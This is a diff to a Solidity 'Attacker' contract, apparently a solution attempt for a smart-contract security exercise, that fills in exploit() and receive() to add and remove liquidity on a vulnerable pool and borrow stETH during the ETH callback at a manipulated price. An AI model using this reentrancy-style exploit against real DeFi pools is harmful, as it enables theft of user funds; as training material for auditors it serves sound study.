@@ -9,6 +9,7 @@ interface IVulnerablePool {
     function removeLiquidity(uint256 lp_amount) external returns (uint256, uint256);
     function getSpotPriceStEth(uint256 amount) external view returns (uint256);
     function getSpotPriceEth(uint256 amount) external view returns (uint256);
+    function lpToken() external view returns (address);
 }
 
 
@@ -35,7 +36,10 @@ contract Attacker {
 
 
     receive() external payable {
-        
+        uint ethBalance = 516666666666666666; // address(this).balance;
+        // uint price  = ethBalance * 100 / (OVERCOLLATERALLIZATION_PERCENTAGE+FEE_PERCENTAGE);
+        // uint amount = target.getSpotPriceEth(price);
+        reader.borrowStEth{value: ethBalance}(1 ether);
         /*
             Your code goes here!
         */
@@ -43,6 +47,12 @@ contract Attacker {
 
 
     function exploit() public payable {
+        stEth.approve(address(target), type(uint256).max);
+        target.addLiquidity{value: 2 ether}(2 ether, 2 ether);
+        target.removeLiquidity(
+            IERC20(target.lpToken()).balanceOf(address(this))
+        );
+        
         /*
             Your code goes here!
         */      
